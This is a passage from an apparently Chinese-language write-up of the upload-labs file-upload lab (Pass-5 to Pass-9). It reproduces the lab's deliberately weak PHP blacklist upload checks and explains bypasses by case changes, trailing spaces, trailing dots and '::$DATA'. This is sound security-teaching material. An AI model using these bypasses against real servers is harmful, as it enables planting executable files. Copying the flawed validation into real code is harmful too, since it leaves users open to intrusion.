class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现与上一关少了统一大小写</p><p>即没有<code>$file_ext = strtolower($file_ext); //转换为小写</code>这一行代码，所以用大小写绕过，上传<strong>phP</strong>之类的文件绕过即可</p><h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6-空格绕过"></a>Pass-6-空格绕过</h2><p>查看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现其没有对首尾去除空格，于是我们可以用bp截断，然后再文件明后面添加空格进行绕过<br><img src="/2020/11/16/upload-labs/image-20201118003043021.png" alt="image-20201118003043021" loading="lazy"></p><h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7-点绕过"></a>Pass-7-点绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是黑名单没有对后缀名进行去.操作利用Windows特性会自动去掉后缀名中最后的.可在后缀名中加”.”绕过。即可构造**.php.**来绕过上传</p><p><img src="/2020/11/16/upload-labs/image-20201118004432252.png" alt="image-20201118004432252" loading="lazy"></p><h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8-::$DATA绕过"></a>Pass-8-::$DATA绕过</h2><p>查看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单限制，没有去除文件名后缀的<code>::$DATA</code>, 同样可以利用 windows 特性, 在后缀添加<code>::$DATA</code>即可绕过</p><p><img src="/2020/11/16/upload-labs/image-20201118004846869.png" alt="image-20201118004846869" loading="lazy"></p><h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9-点+空格+点绕过"></a>Pass-9-点+空格+点绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string 